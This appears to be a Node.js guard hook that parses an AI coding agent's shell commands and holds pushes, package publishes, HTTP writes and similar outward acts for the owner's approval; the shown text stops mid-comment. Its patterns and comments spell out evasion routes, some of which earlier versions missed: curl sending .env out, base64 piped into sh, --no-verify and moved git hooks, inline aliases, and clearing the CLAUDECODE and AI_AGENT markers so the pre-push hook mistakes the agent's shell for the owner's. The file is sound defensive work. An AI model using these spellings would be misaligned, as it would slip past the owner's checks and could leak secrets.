// PreToolUse guard: asks the user before any shell command that reaches outside this machine - a git push in
// any spelling, or a gh command that writes to GitHub. A permissions.ask rule matches only the literal prefix
// "git push", so "git -C <path> push" ran without a prompt; this reads the command the way a shell does.
// Usage (settings.json): command "node", args [<this file>]; an optional second arg is a log file that records
// each decision (time, tool, ask/pass - never the command), used to prove the hook fires.
// Limits: it reads ordinary spellings, nested shells (bash -c, powershell -Command) and inline aliases; it is no
// match for a command built at run time (a variable holding "push", $'..' escapes,
// Invoke-Expression on joined strings).
const fs = require('node:fs');
const path = require('node:path');

const BACKSLASH = String.fromCharCode(92);
const BACKTICK = String.fromCharCode(96);
const LF = String.fromCharCode(10);
const CR = String.fromCharCode(13);
const MAX_DEPTH = 3;

const GIT_VALUE_OPTIONS = new Set(['-c', '--git-dir', '--work-tree', '--namespace', '--super-prefix', '--config-env', '--attr-source', '--shallow-file']);
const GIT_OUTWARD = new Set(['push', 'send-pack', 'send-email']);
// A package registry is public: these subcommands change what it holds (--dry-run changes nothing).
const PACKAGERS = new Set(['npm', 'npm.cmd', 'pnpm', 'pnpm.cmd', 'yarn', 'yarn.cmd', 'bun', 'bun.exe']);
const REGISTRY_WRITES = new Set(['publish', 'unpublish', 'dist-tag', 'deprecate', 'owner']);
// Options that take no value, so a --dry-run after one is a flag. Any other option may take it as its value.
const NPM_FLAGS = new Set(['--dry-run', '--json', '--force', '-f', '--ignore-scripts', '--provenance', '--workspaces', '-ws', '--include-workspace-root', '--no-git-checks', '--silent', '-s', '--quiet', '-q', '--verbose', '-d']);
// HTTP clients: a method other than GET or HEAD, or a body, sends something out. In Windows PowerShell 5.1, curl and
// wget are names for Invoke-WebRequest, so its -Method and -Body count for them too.
const HTTP_CLIENTS = /^(curl|wget|invoke-webrequest|invoke-restmethod|iwr|irm)(\.exe)?$/;
const GIT_NESTED_PUSH = new Set(['lfs', 'subtree']);
// A git bridge that writes to another system: git svn dcommit (and the verbs that make branches and tags there),
// git p4 submit.
const GIT_BRIDGES = { svn: ['dcommit', 'branch', 'tag', 'set-tree', 'commit-diff'], p4: ['submit', 'commit'] };
// Other programs that publish or send to a remote: the subcommands that do it. Only cargo has a dry run.
const PUBLISHERS = { docker: ['push'], podman: ['push'], cargo: ['publish', 'yank', 'owner'], twine: ['upload'], gem: ['push', 'yank', 'owner'], nuget: ['push', 'delete'] };
// The gem write a word may name: gem takes any start of a command's name that fits one command (gem pu).
const gemWrite = (w) => (/^[a-z]/.test(w) ? PUBLISHERS.gem.find((c) => c.startsWith(w)) || '' : '');
// docker and podman build straight to a registry with --push or an output of type registry or push=true.
const IMAGE_BUILDERS = new Set(['docker', 'podman']);

const GH_VALUE_OPTIONS = new Set(['-r', '--repo', '--hostname']);
const GH_READ_GROUPS = new Set(['search', 'status', 'browse', 'completion', 'help', 'version']);
const GH_READ_SUBS = new Set(['view', 'list', 'status', 'checks', 'diff', 'watch', 'download']);

const { plainText, joinContinuations, tokenize, canonical } = require('./guard-read.cjs');
const { ownerYes, askText, yesText, neverText, heldText } = require('./owner-yes.cjs');

// A program name without a Windows launch extension: docker.exe -> docker, twine.cmd -> twine.
const base = (name) => name.replace(/\.(exe|cmd|bat|com|ps1)$/, '');

// cargo's dry run: a standalone --dry-run or -n before any --, not the value of the option before it.
function cargoDryRun(rest) {
	for (let i = 0; i < rest.length; i++) {
		if (rest[i] === '--') return false;
		const prev = rest[i - 1] ?? '';
		const taken = prev.startsWith('-') && !prev.includes('=') && !['--dry-run', '-n', '--allow-dirty', '--no-verify', '--locked', '--frozen', '--offline', '-v', '-q'].includes(prev);
		if ((rest[i] === '--dry-run' || rest[i] === '-n') && !taken) return true;
	}
	return false;
}

// A word naming another host: rsync://, host:path, user@host:path, [::1]:path. A drive letter (C:/x, C:\x) is local.
// MSYS and Cygwin rsync read C:/x as a host named C, so any word with a colon may name another host.
const remoteWord = (w) => !w.startsWith('-') && w.includes(':');
// A docker or podman build that sends its image to a registry: --push (unless =false), an output that is not a
// local one, or imagetools create (writes a manifest to the registry).
function imageBuildPush(rest) {
	if (rest.includes('imagetools') && rest.includes('create')) return true;
	// The safe side for every other way to set an output (a later type= in one value, bake's --set x.output=, a short
	// flag cluster): any word naming a registry or a push= asks.
	if (rest.some((w) => /registry|type=image/.test(w) || /(^|[,.])push=(?!(false|0|f)(,|$))/.test(w))) return true;
	for (let k = 0; k < rest.length; k++) {
		const w = rest[k];
		if (w === '--push' || (w.startsWith('--push=') && !/^--push=(false|0|f)$/.test(w))) return true;
		let out = null;
		if (w === '-o' || w === '--output') out = rest[k + 1] ?? '';
		else if (w.startsWith('--output=')) out = w.slice('--output='.length);
		else if (/^-o./.test(w)) out = w.slice(2);
		if (out !== null && !/^(type=(local|tar|docker)(,|$)|-$|[^=,]+$)/.test(out)) return true;
	}
	return false;
}

// The program a word names, whatever folder it sits in: "C:/Program Files/Git/cmd/git.exe" -> "git.exe".
function programName(word) {
	const parts = word.split('/').join(BACKSLASH).split(BACKSLASH);
	return parts[parts.length - 1].toLowerCase();
}

// Where git's subcommand sits: past its options, and past the value an option takes (-C ., -c x=y).
function gitSubAt(words, start) {
	let i = start;
	while (i < words.length && words[i].startsWith('-')) i += GIT_VALUE_OPTIONS.has(words[i]) ? 2 : 1;
	return i;
}

// The git commands that run a project hook (pre-commit, commit-msg, pre-push and the others the shims run).
const HOOK_SUBS = new Set(['commit', 'push', 'merge', 'rebase', 'am', 'pull', 'cherry-pick', 'revert', 'checkout', 'switch']);

// The git hooks are the last check before a commit or a push leaves: skipping them, or moving where git finds them,
// holds the command (T1: on 1.24.0 both ran with no guard, and a push then landed on main). Reading the setting passes.
function gitHooksOff(words, start, at) {
	// git takes a long option by any start that names only it: --no-verif skips the hooks too (the 1.25.0 sweep).
	if (words.slice(start).some((w) => /^--no-ve(r(i(f(y)?)?)?)?(=|$)/.test(w))) return 'git with its hooks skipped';
	// commit's -n is --no-verify, alone or in a cluster of short flags (-anm x); a flag that takes a value ends the
	// cluster, so -mn is a message "n".
	if (words[at] === 'commit') {
		for (const w of words.slice(at + 1)) {
			if (w === '--') break;
			if (!/^-[a-z]/.test(w)) continue;
			for (const ch of w.slice(1)) {
				if (ch === 'n') return 'git with its hooks skipped';
				if ('mfcct'.includes(ch) || /[^a-z]/.test(ch)) break;
			}
		}
	}
	// An included config file can set the hooks path out of sight (-c include.path=f, includeIf.<cond>.path; the 1.26.0
	// security review, S2).
	if (words.some((w) => w.includes('hookspath') || /(^|=)include(if\..*)?\.path(=|$)/.test(w))) {
		const reads = words[at] === 'config' && words.slice(at + 1).some((w) => /^(--get|--get-all|--get-regexp|--list|-l|get|list|--show-origin|--show-scope)$/.test(w));
		if (!reads) return 'git with its hooks moved';
	}
	// Another git folder brings its own config, aliases, hooks and the programs its config names (a pager, fsmonitor):
	// any git command that names one is held, reads too (S2, and the reviews on a192e1f and 46260d3).
	if (words.slice(0, at).some((w) => /^(--git-dir(=|$)|git_dir=|git_common_dir=)/.test(w))) return 'git with its hooks moved';
	// git config --edit opens the whole file, hooksPath included.
	if (words[at] === 'config' && words.slice(at + 1).some((w) => w === '-e' || w === '--edit' || w === 'edit')) return 'git with its hooks moved';
	return '';
}

function gitOutward(words, start) {
	// An alias defined on the command line can stand for anything, push included.
	const at = gitSubAt(words, start);
	for (let i = start; i < at; i++) if (words[i] === '-c' && (words[i + 1] ?? '').startsWith('alias.')) return 'git with an inline alias';
	const sub = words[at];
	if (sub === undefined) return '';
	// A subcommand built at run time ($(echo push), ${SUB}, a backtick span) may be push: the safe side (T1).
	if (/[$`%]/.test(sub)) return 'git with a subcommand built at run time';
	const hooks = gitHooksOff(words, start, at);
	if (hooks) return hooks;
	// A read that writes a file anywhere or runs a program (--output, grep's -O pager, an external diff or textconv)
	// is no read: the allow list lets git diff, log and show run without a prompt, so these spellings are held (T2).
	// The words are read in lower case, so grep's -O (a pager) and -o (only the match) look alike: both are held.
	if (words.slice(at + 1).some((w) => /^(--output(=|$)|--open-files-in-pager|--ext-diff$|--textconv$)/.test(w) || (sub === 'grep' && /^-o/.test(w)))) return 'git that writes a file or runs a program';
	// Where origin points decides where a feature-branch push goes without a yes, so moving it is held (T1).
	const after = words.slice(at + 1).filter((w) => !w.startsWith('-'));
	if (sub === 'remote' && ['add', 'set-url', 'rename', 'set-head'].includes(after[0])) return 'git with its remote changed';
	// The local origin/HEAD names the default branch the pre-push hook holds when the remote names none (K29).
	if ((sub === 'symbolic-ref' || sub === 'update-ref') && after.some((w) => /^refs\/remotes\/[^/]+\/head$/i.test(w))) return 'git with its remote changed';
	// A remote's push refspec decides which branch a bare git push lands on (remote.origin.push HEAD:main), so it is
	// held with the url (the 1.25.0 sweep).
	const remoteKey = (w) => /^(remote\.[^=]*\.(url|pushurl|push)|url\.[^=]*\.(insteadof|pushinsteadof))(=|$)/.test(w);
	if (words.slice(start, at).some(remoteKey)) return 'git with its remote changed';
	if (sub === 'config' && words.slice(at + 1).some(remoteKey) && !words.slice(at + 1).some((w) => /^(--get|--get-all|--get-regexp|--list|-l|get|list)$/.test(w))) return 'git with its remote changed';
	if (GIT_OUTWARD.has(sub)) return 'git ' + sub;
	if (GIT_NESTED_PUSH.has(sub) && words.slice(at + 1).includes('push')) return 'git ' + sub + ' push';
	const verb = Object.hasOwn(GIT_BRIDGES, sub) ? words.slice(at + 1).find((w) => GIT_BRIDGES[sub].includes(w)) : undefined;
	if (verb) return 'git ' + sub + ' ' + verb;
	return '';
}

function ghApiWrites(words, start) {
	for (let i = start; i < words.length; i++) {
		const word = words[i];
		let method = '';
		if (word === '-x' || word === '--method') method = words[i + 1] ?? '';
		else if (word.startsWith('--method=')) method = word.slice('--method='.length);
		else if (word.startsWith('-x')) method = word.slice(2);
		// Fields and an input body turn a gh api call into a POST unless a method says otherwise.
		else if (['-f', '--field', '--raw-field', '--input'].some((flag) => word.startsWith(flag))) return true;
		if (method && method !== 'get') return true;
	}
	return false;
}

// npm publish, pnpm publish, yarn npm publish: a registry write among the first two subcommand words.
// An option's value may sit before the subcommand (npm --otp 1 publish), so a write word anywhere counts; asking on a
// package that happens to share the name is the safe side. npm (nopt) reads its flags in order and the last one wins;
// it drops extra dashes, flips the value on each no- in any case, takes a unique abbreviation (--dry), and reads no
// flag after --. So a dry run counts only when the last word that sets it is exactly --dry-run (not followed by
// false) or --dry-run=true; any other word that may set it leaves the command a real write.
function registryWrite(words, start) {
	const rest = words.slice(start);
	let dry = false;
	for (let i = 0; i < rest.length; i++) {
		const w = rest[i];
		if (w === '--') break;
		if (!w.startsWith('-')) continue;
		// npm reads a flag's name as written: --DRY-RUN is an unknown setting, not a dry run (the 1.23.0 sweep).
		let name = w.replace(/^-+/, '').split('=')[0];
		while (/^no-/i.test(name)) name = name.slice(3);
		if (name.length < 2 || !'dry-run'.startsWith(name)) continue;
		// After an option that may take a value (--registry --dry-run), --dry-run is that value, not a flag.
		const prev = rest[i - 1] ?? '';
		const taken = prev.startsWith('-') && !prev.includes('=') && !NPM_FLAGS.has(prev);
		if (w === '--dry-run') dry = !taken && !/^(false|0|no)$/i.test(rest[i + 1] ?? '');
		else dry = /^--dry-run=(true|1|yes)$/.test(w);
	}
	if (dry) return '';
	const hit = rest.find((w) => REGISTRY_WRITES.has(w.toLowerCase()));
	return hit ? 'a package ' + hit : '';
}

// The words as written: curl's flags are case-sensitive (-F is a form, -f is --fail; -I is HEAD, -i is headers).
function httpWrite(name, words) {
	const curl = name.startsWith('curl');
	// curl's -K / --config reads its options, a body included, from a file (the 1.25.0 sweep).
	if (curl && words.some((w) => /^(-[A-Za-z0-9]*K|--config(=|$))/.test(w))) return 'an HTTP request with options from a file';
	// Options that read a file into the request (a header, a query or a variable from @file), and wget's list of
	// addresses from a file.
	// Any value curl reads from @file, whatever option holds it (-H @f, -sH@f, --proxy-header=@f), and wget's commands
	// and options from a file or the command line (-e, --execute, --config).
	if (curl && words.some((w) => /^--(url-query|variable|expand-[\w-]+)(=|$)/.test(w) || /^(@|-[A-Za-z0-9]*@|--[\w-]+=@)/.test(w))) return 'an HTTP request that reads a file';
	// wget, like getopt, takes any start of a long option's name (--exec, --conf, --post-f).
	const WGET_READS = ['input-file', 'execute', 'config', 'post-file', 'post-data', 'body-file', 'body-data'];
	const wgetLong = (w) => { const n = w.slice(2).split('=')[0].toLowerCase(); return n.length >= 2 && WGET_READS.some((o) => o.startsWith(n)); };
	if (/^wget/.test(name) && words.some((w) => /^-[A-Za-z0-9]*[ie]/.test(w) || (w.startsWith('--') && wgetLong(w)))) return 'an HTTP request that reads a file';
	for (let i = 0; i < words.length; i++) {
		const w = words[i];
		const lower = w.toLowerCase();
		let method = '';
		// curl clusters short flags (-sX POST, -sd x): a cluster holding d, F or T sends a body, X names a method. A
		// letter read from an attached value can only add an ask. PowerShell binds a value with a colon (-Method:Post)
		// and takes a unique prefix of a parameter (-Bo, -InF).
		// The cluster's letters end at its first sign: -sT.env is -s -T .env and -sd@.env is -s -d @.env (T1: both passed).
		const cluster = curl && /^-[A-Za-z0-9]/.test(w) ? w.slice(1).match(/^[A-Za-z0-9]*/)[0] : '';
		// -B alone is a prefix too: Body is the only parameter of either cmdlet that starts with B.
		const ps = lower.match(/^-(me(?:t(?:h(?:o(?:d)?)?)?)?|b(?:o(?:d(?:y)?)?)?|inf(?:i(?:l(?:e)?)?)?)(?::(.*))?$/);
		if (cluster.includes('X')) method = cluster.slice(cluster.indexOf('X') + 1) || (words[i + 1] ?? '');
		else if (cluster && /[dFT]/.test(cluster)) return 'an HTTP write';
		else if (lower === '--request' || lower === '--method') method = words[i + 1] ?? '';
		else if (ps && ps[1].startsWith('me')) method = ps[2] !== undefined ? ps[2] : (words[i + 1] ?? '');
		else if (ps) return 'an HTTP write';
		else if (/^--(request|method)=/.test(lower)) method = lower.slice(lower.indexOf('=') + 1);
		else if (curl && (/^-[dFT]/.test(w) || /^--(data(-[\w-]+)?|form(-string)?|upload-file|json)(=|$)/.test(lower))) return 'an HTTP write';
		else if (/^--(post|body)-(data|file)(=|$)/.test(lower)) return 'an HTTP write';
		if (method && !/^(get|head)$/i.test(method)) return 'an HTTP write';
	}
	return '';
}

// gh is read-only only for the subcommands listed; anything else (create, merge, edit, run, sync...) asks.
function ghOutward(words, start) {
	const named = [];
	for (let i = start; i < words.length && named.length < 2; i++) {
		if (words[i].startsWith('-')) {
			if (GH_VALUE_OPTIONS.has(words[i])) i++;
			continue;
		}
		named.push(i);
	}
	if (named.length === 0) return '';
	const group = words[named[0]];
	if (group === 'api') return ghApiWrites(words, named[0] + 1) ? 'gh api with a write method' : '';
	if (GH_READ_GROUPS.has(group)) return '';
	const sub = named.length > 1 ? words[named[1]] : undefined;
	if (sub !== undefined && GH_READ_SUBS.has(sub)) return '';
	return 'gh ' + group + (sub === undefined ? '' : ' ' + sub);
}

// S23-4 (the 1.23.0 verify): the pre-push hook takes a shell without CLAUDECODE and AI_AGENT for the owner's own
// terminal, so naming either marker, clearing the whole environment, or a PowerShell removal on the Env: drive (by
// wildcard or filter, no full name in sight; the 1.24.0 sweep) or a .NET call that sets the environment is held.
// Reading Env: or setting $env:X is not.
function markersCleared(flat) {
	// An unset or env -u whose name is built at run time may name a marker (the 1.28.0 sweep): held.
	if (/\b(unset|export\s+-n|declare\s+\+x|typeset\s+\+x|local\s+\+x)\b[^;|&\n]*[$`]|--unset[= ][^;|&\n\s]*[$`]|\benv(\.exe)?\s+([^;|&\n]*\s)?-u\s*[^;|&\n\s]*[$`]/i.test(flat)) return true;
	const psClear = /(^|[^$\w])env:/i.test(flat) && /(^|[\s;|&(])(remove-item|ri|rm|del|erase|rd|rmdir|clear-item|cli)(\s|;|$)/i.test(flat);
	return /\b(CLAUDECODE|AI_AGENT)\b/i.test(flat) || /\benv(\.exe)?\s+([^;|&\n]*\s)?(-i|--ignore-environment|-)(\s|$)/i.test(flat) || psClear || /\[(system\.)?environment\]::setenvironmentvariable/i.test(flat);
}

// K2 (the 1.27.0 sweep): a marker named only as a word a plain reader prints or searches for, or inside a commit
// message, clears nothing. The exemption holds only for a command with no way to clear or run anything: no setting,
// unsetting or env, no shell, eval or source, no Env: drive, and every command that names a marker a reader of it.
const MARKER = /\b(CLAUDECODE|AI_AGENT)\b/i;
const MARKER_READERS = new Set(['grep', 'egrep', 'fgrep', 'rg', 'findstr', 'select-string', 'sls', 'echo', 'printf', 'cat', 'type', 'get-content', 'gc', 'head', 'tail', 'git']);
function markerOnlyNamed(text) {
	// Read as the shell reads it too (u"nset" is unset), and never with -v (printf -v sets a variable) or a redirect
	// (a reader writing the marker's name into a file, a profile among them): the 1.28.0 sweep.
	if (/(^|\s)-v\b|[<>]/.test(text) || markerOnlyNamed.strict(plainText(text, 'Bash').replace(/["']/g, ''))) return false;
	if (/\b(CLAUDECODE|AI_AGENT)\s*\+?=|\b(unset|export|declare|typeset|local|readonly|set|setx|env|exec|eval|source|iex|invoke-expression|xargs|sh|bash|zsh|dash|ksh|pwsh|powershell|cmd|start-process|saps|remove-item|ri|clear-item|cli|new-item|ni|set-item|si|set-content|sc|rv|remove-variable)(\.exe)?\b|env:|setenvironmentvariable|(^|[\s;|&(])\.\s|[`]|\$\(/i.test(text)) return false;
	const segments = tokenize(joinContinuations(text));
	for (let s = 0; s < segments.length; s++) {
		const segment = segments[s];
		const words = segment.filter((w) => !w.redirect);
		if (!words.some((w) => MARKER.test(w.value))) continue;
		const name = programName(words[0]?.value || '');
		if (!MARKER_READERS.has(name)) return false;
		// Piped on, the name reaches the next program as data it may act on (python popping it from its environment): only
		// another reader may take it (the 1.28.0 sweep).
		for (let k = s; /^\|/.test(segments[k].end || '') && segments[k + 1]; k++) {
			if (!MARKER_READERS.has(programName(segments[k + 1].filter((w) => !w.redirect)[0]?.value || ''))) return false;
		}
		// In git, only inside the message given to -m or --message.
		if (name === 'git' && words.some((w, k) => MARKER.test(w.value) && !(k > 0 && /^(-m|--message)$/.test(words[k - 1].value)))) return false;
	}
	return true;
}

markerOnlyNamed.strict = (s) => /\b(unset|export|declare|typeset|local|readonly|set|setx|env|exec|eval|source|iex|invoke-expression|xargs|sh|bash|zsh|dash|ksh|pwsh|powershell|cmd|remove-item|clear-item|set-item|set-content|new-item|remove-variable)\b|env:|setenvironmentvariable/i.test(s);

function findOutward(text, depth) {
	// The owner's yes and resume for the sweep tools are read by approve.mjs itself from the owner's pop-up tap (T2), so
	// their spelling needs no hold here. A Claude session started from a shell with a thread message's shape writes a
	// turn like the owner's own (E27), so it is held still.
	if (/(^|[\s;|&(/\\"'])claude(\.exe|\.cmd)?(\s|$)/i.test(text) && /<wake|author-id|trust=["']?principal/i.test(text)) return 'a session started with a thread message';
	const flat = text.replace(/[\\`^]\r?\n/g, '').replace(/[\\`^'"]/g, '');
	if (markersCleared(flat) && !markerOnlyNamed(text)) return MARKERS;
	// The pre-push hook lets an AI push to main or a tag only with this marker set, so setting it is the owner's yes.
	if (/KIT_PUSH_APPROVED/i.test(flat)) return 'the push hook\'s owner-yes marker';
	// A program or a word built at run time, then an outward verb in the same command: $G push, "$(which git)" push.
	if (/[$`%][^;|&\n]*?(^|[\s)"'`])(push|send-pack|publish|dcommit|upload)(\s|$)/i.test(flat)) return 'a command built at run time';
	if (/\bgit\b[^;|&\n]*\balias\.[\w-]+/i.test(text)) return 'git with an alias';
	// An alias set from the environment names no git before it (GIT_CONFIG_KEY_0=alias.x, cargo's CARGO_ALIAS_X), and
	// its value may be spelled any way: any config from the environment, or cargo's --config, asks.
	if (/GIT_CONFIG_(COUNT|KEY_\d+|PARAMETERS)/i.test(text) && /\bgit\b/i.test(text)) return 'git with config from the environment';
	if (/CARGO_ALIAS_\w+/i.test(text) || (/\bcargo\b/i.test(text) && /--config\b/i.test(text))) return 'cargo with an alias or config';
	// xargs -I puts its input in place of any word, git's subcommand too; -I{} splits into two commands when read.
	if (/\bxargs(\.exe)?\b[^;|&\n]*\s(-[A-Za-z0-9]*[iIJ]|--replace)[^;|&\n]*\bgit(\.exe)?\b/.test(text)) return 'git through xargs';
	// A backtick span is a command bash runs first, wherever it sits; the tokenizer splits it into words.
	if (depth < MAX_DEPTH) for (const m of text.matchAll(/`([^`]+)`/g)) { const hit = findOutward(m[1], depth + 1); if (hit) return hit; }
	// A GET still sends what its address holds: an HTTP client in a command that builds text at run time ($( ), a
	// backtick, <( ), any variable, read or xargs) may carry a file out in the address, so it asks (the 1.25.0 sweep:
	// curl http://x/$(cat .env)). The config files the clients read by themselves (.curlrc, CURL_HOME, .wgetrc) can
	// add a body to a plain GET, so naming one asks too.
	const client = /(^|[^\w.-])(curl|wget|iwr|irm|invoke-webrequest|invoke-restmethod)(\.exe)?($|[^\w.-])/i.test(text);
	if (client && (/\$|`|<\(|\bxargs\b|\bread\b/.test(text))) return 'an HTTP request built at run time';
	if (/[._]curlrc|CURL_HOME|[._]wgetrc|WGETRC/i.test(text)) return 'an HTTP client\'s config';
	// A shell fed its script on its input (a pipe, -s, a < file) runs a body the text does not show unless that body is
	// written out in the command (echo or printf of plain text, read as a nested command): base64 -d | sh pushed main
	// unseen (the plan check's P9, the 1.28.0 sweep). Such a body is held.
	const fed = tokenize(joinContinuations(text));
	for (let s = 0; s < fed.length; s++) {
		const words = fed[s].filter((w) => !w.redirect).map((w) => w.value);
		const shell = /^(sh|bash|zsh|dash|ksh|pwsh|powershell|cmd|iex|invoke-expression)$/i.test(base(programName(words[0] || '')));
		if (!shell || words.some((w) => /^(-c|-command|\/c|-encodedcommand|-file)$/i.test(w))) continue;
		const prev = s > 0 && /^\|/.test(fed[s - 1].end || '') ? fed[s - 1] : null;
		const literal = prev && /^(echo|printf|write-output)$/i.test(base(programName(prev[0]?.value || ''))) && !prev.some((w) => w.redirect || /[$`(]/.test(w.value));
		if ((prev && !literal) || (!prev && words.slice(1).includes('-s'))) return 'a shell fed a script the guard cannot read';
	}
	// Its input from a file (sh < push.txt); a here-document or here-string is written out in the text, so read.
	if (/(^|[\s;&|(])(sh|bash|zsh|dash|ksh|pwsh|powershell)(\.exe)?(\s[^;|&\n]*?)?(^|[^<\d])<(?![<(&])/im.test(text)) return 'a shell fed a script the guard cannot read';
	for (const all of tokenize(joinContinuations(text))) {
		const segment = all.filter((word) => !word.redirect);
		const words = segment.map((word) => word.value.toLowerCase());
		for (let i = 0; i < segment.length; i++) {
			const name = programName(segment[i].value);
			let hit = '';
			const bare = base(name);
			const tool = Object.hasOwn(PUBLISHERS, bare) ? bare : '';
			if (/^git-(push|send-pack)$/.test(bare) || (bare === 'git-lfs' && words[i + 1] === 'push')) hit = name;
			// git-svn and git-p4 are the bridges' own programs: git-svn dcommit is git svn dcommit.
			else if (/^git-(svn|p4)$/.test(bare)) hit = gitOutward([bare.slice(4), ...words.slice(i + 1)], 0);
			else if (name === 'git' || name === 'git.exe') {
				hit = gitOutward(words, i + 1);
				// xargs hands git its subcommand from input, so a git with none after xargs could be a push.
				const x = words.slice(0, i).findIndex((w) => programName(w) === 'xargs' || programName(w) === 'xargs.exe');
				// With -I (or -i, --replace) the input may stand in any word, the subcommand too: git % is git push.
				if (!hit && x >= 0 && (gitSubAt(words, i + 1) >= words.length || words.slice(x + 1, i).some((w) => /^(-[a-z0-9]*[ij]|--replace)/.test(w)))) hit = 'git through xargs';
			}
			else if (name === 'gh' || name === 'gh.exe') hit = ghOutward(words, i + 1);
			else if (PACKAGERS.has(name)) hit = registryWrite(segment.map((word) => word.value), i + 1);
			// gem runs any unique start of a command's name: gem pu is gem push.
			else if (tool === 'gem' && words.slice(i + 1).some((w) => gemWrite(w))) hit = 'gem ' + gemWrite(words.slice(i + 1).find((w) => gemWrite(w)));
			else if (tool &&words.slice(i + 1).some((w) => PUBLISHERS[tool].includes(w)) && !(tool === 'cargo' && words.slice(i + 1).includes('publish') && cargoDryRun(words.slice(i + 1)))) {
				hit = tool + ' ' + words.slice(i + 1).find((w) => PUBLISHERS[tool].includes(w));
			}
			else if (IMAGE_BUILDERS.has(tool) && imageBuildPush(words.slice(i + 1))) hit = tool + ' build to a registry';
			// scp always copies to or from another host; rsync does when a word names one (host:path, rsync://).
			else if (bare === 'scp') hit = 'scp';
			else if (bare === 'rsync' && words.slice(i + 1).some((w) => remoteWord(w) || (w.startsWith('--') && w.includes('=') && remoteWord(w.slice(w.indexOf('=') + 1))))) hit = 'rsync to another host';
			else if (HTTP_CLIENTS.test(name)) hit = httpWrite(name, segment.slice(i + 1).map((word) => word.value));
			if (hit) return hit;
		}
		// Quoted text may be a whole command handed to another shell: bash -c 'git push'. A redirect target is read too,
		// as the delete guard reads it: a here-string feeds a shell (bash <<< "git push"), and $( ) or backticks in a
		// target run before the redirect does (the 1.22.0 sweep).
		if (depth < MAX_DEPTH) {
			// A message git or gh is handed (-m, --body ...) is text it stores, never a command it runs (K2).
			const tool = programName(all[0]?.value || '');
			for (const [k, word] of all.entries()) {
				if ((tool === 'git' || tool === 'gh') && k > 0 && !word.redirect && /^(-m|--message|--body|--title|--notes)$/.test(all[k - 1].value) && !/\$\(|`/.test(word.value)) continue;
				const run = word.quoted || (word.redirect && /\$\(|`/.test(word.value));
				const hit = run ? findOutward(word.value.replace(/^`|`$/g, ''), depth + 1) : '';
				if (hit) return hit;
			}
		}
	}
	return '';
}

// Every string the tool will run, whatever the field is called; the description is only shown, never run.
function collectStrings(value, out, depth) {
	if (typeof value === 'string') out.push(value);
	else if (value && typeof value === 'object' && depth < 5) {
		for (const [key, inner] of Object.entries(value)) {
			if (key !== 'description') collectStrings(inner, out, depth + 1);
		}
	}
}

// A push to a feature branch of origin, inside the push bound (T1, the owner 2026-11-10: "Tight bounds"): the whole
// command is one `git push [-u|--set-upstream] [-q|-v] origin <branch>` (or HEAD:<branch>, <branch>:<branch>), the
// branch written out, not main or master, with no force, delete, tag, mirror or skipped hooks. It goes without a yes:
// main is protected on GitHub, and the pre-push hook scans every pushed commit for secrets and logs the push.
const PUSH_FLAGS = new Set(['-u', '--set-upstream', '-q', '--quiet', '-v', '--verbose']);
const BRANCH = /^(?!-)(?!.*\.\.)(?!.*@\{)[A-Za-z0-9._/-]+$/;
function boundedPush(input) {
	// A push typed into the owner's terminal tab runs in a folder its own cwd field names, which the bound never reads
	// (the plan check's P7, the 1.28.0 sweep): never inside the bound.
	if (input && input.tool_name === 'mcp__terminal__run_in_terminal') return false;
	const command = String((input && input.tool_input && input.tool_input.command) ?? '');
	// Plain characters only: no quote, escape, variable, glob, redirect or second command can hide in it.
	if (!/^[A-Za-z0-9 ._/:+=-]+$/.test(command)) return false;
	const words = command.trim().split(/ +/);
	if (words[0] !== 'git' || words[1] !== 'push') return false;
	const rest = words.slice(2).filter((w) => !PUSH_FLAGS.has(w));
	if (rest.length !== 2 || rest[0] !== 'origin') return false;
	const parts = rest[1].split(':');
	if (parts.length > 2) return false;
	const [from, to = parts[0]] = parts;
	const target = to.replace(/^refs\/heads\//, '');
	if (!BRANCH.test(target) || target.startsWith('refs/') || /^(main|master|head)$/i.test(target)) return false;
	return from === 'HEAD' || (BRANCH.test(from) && !from.startsWith('refs/'));
}

// Which limit of the push bound a held push hit, for the refusal's words only: the decision above never reads this.
// rule:outward-acts holds the bound: a plain `git push [-u] origin <feature branch>`, never main or master, a tag, a
// force or a delete.
function pushLimit(command) {
	const words = String(command).trim().split(/\s+/);
	const at = words.indexOf('push');
	if (at < 0) return 'it is not a plain push to origin, so it is outside the push bound';
	// The words up to a redirect or a second command; an option's value (-o x, --repo x) is not a refspec (C18).
	const all = words.slice(at + 1);
	const cut = all.findIndex((w) => /^(\d?>|>|<|\||&|;|&&|\|\|)/.test(w) || /[;&|]$/.test(w));
	const rest = cut < 0 ? all : all.slice(0, cut);
	const flags = rest.filter((w) => w.startsWith('-'));
	const specs = rest.filter((w, i) => !w.startsWith('-') && !/^(-o|--push-option|--repo|--receive-pack|--exec)$/.test(rest[i - 1] || ''));
	const dests = specs.slice(1).map((s) => s.replace(/^\+/, '').split(':').pop().replace(/^refs\/heads\//, ''));
	if (flags.some((f) => /^(-d|--delete)$/.test(f)) || specs.slice(1).some((s) => s.startsWith(':'))) return 'a delete is outside the push bound';
	if (flags.some((f) => /^(-f|--force|--force-with-lease|--force-if-includes)(=|$)/.test(f)) || specs.slice(1).some((s) => s.startsWith('+'))) return 'a force push is outside the push bound';
	if (flags.some((f) => /^--(tags|follow-tags|mirror|all|branches)$/.test(f)) || specs.slice(1).some((s) => /refs\/tags\//.test(s))) return 'a tag push is outside the push bound';
	const main = dests.find((d) => /^(main|master)$/i.test(d));
	if (main) return `a push to ${main.toLowerCase()} is outside the push bound; ${main.toLowerCase()} takes a PR, and a tool pushes there only as a new repo's first push (the pre-push hook refuses any other)`;
	if (specs[0] !== 'origin') return 'it is not a plain push to origin, so it is outside the push bound';
	if (cut >= 0) return 'a redirect or a second command makes it more than one plain push, so it is outside the push bound; run the push on its own';
	return 'it is not a plain push of one named feature branch, so it is outside the push bound';
}

// A gate bypass switches a check off; it sends nothing outward, and no pop-up yes lets a tool do it (the owner's lock,
// 2026-11-11, matching the deny rules settings.json already holds for the plain spellings).
// Clearing the AI shell's markers joined them on the owner's pick, 2026-11-12 (C6): the pre-push hook then takes the
// shell for the owner's terminal, so it switches the hook's AI checks off.
const MARKERS = 'a command that clears the AI shell\'s markers';
const BYPASS = new Set(['git with its hooks skipped', 'git with its hooks moved', 'a write to main that runs no pre-push hook', MARKERS]);
// A command the guard cannot read is held, not called an outward act, and no yes runs it: the yes could not be matched
// to what would run (C14).
const HELD = new Set(['a command too long to read', 'the guard could not read this command']);

// A gate bypass anywhere in a command, not only as the first reason found (the 1.26.0 sweep: a push or the marker in
// front of it hid it, and a pop-up yes then let it run). It fails closed: any spelling of git's --no-verify, any
